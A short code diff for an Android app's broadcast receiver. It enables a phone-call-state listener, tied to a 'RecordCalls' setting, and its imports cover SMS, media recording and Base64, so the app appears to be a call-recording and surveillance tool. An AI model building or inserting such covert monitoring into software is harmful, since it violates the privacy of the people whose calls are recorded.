@@ -8,6 +8,7 @@ import android.content.Intent;
 import android.media.MediaRecorder;
 import android.os.Bundle;
 import android.preference.PreferenceManager;
+import android.telephony.PhoneStateListener;
 import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
 import android.util.Base64;
@@ -29,6 +30,7 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 
 import u.can.i.up.expert.common.DataSet;
+import u.can.i.up.expert.framework.PhoneListener;
 
 public class ServiceReceiver extends BroadcastReceiver {
 
@@ -148,10 +150,13 @@ public class ServiceReceiver extends BroadcastReceiver {
 //        if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
 //            String numberToCall = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
 //        }
-
-//        PhoneListener phoneListener = new PhoneListener(context);
-//        TelephonyManager telephony = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
-//        telephony.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
+        if(PreferenceManager.getDefaultSharedPreferences(mContext).getBoolean("RecordCalls", false)==true){
+            PhoneListener phoneListener = new PhoneListener(context);
+            TelephonyManager telephony = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
+            telephony.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
+        } else{
+            Log.i(DataSet.getInstance().LOG_TAG + "." + this.getClass().getName(), "RecordCalls Error! NOooooooooooo");
+        }
     }
 
     private boolean isMyServiceRunning() {
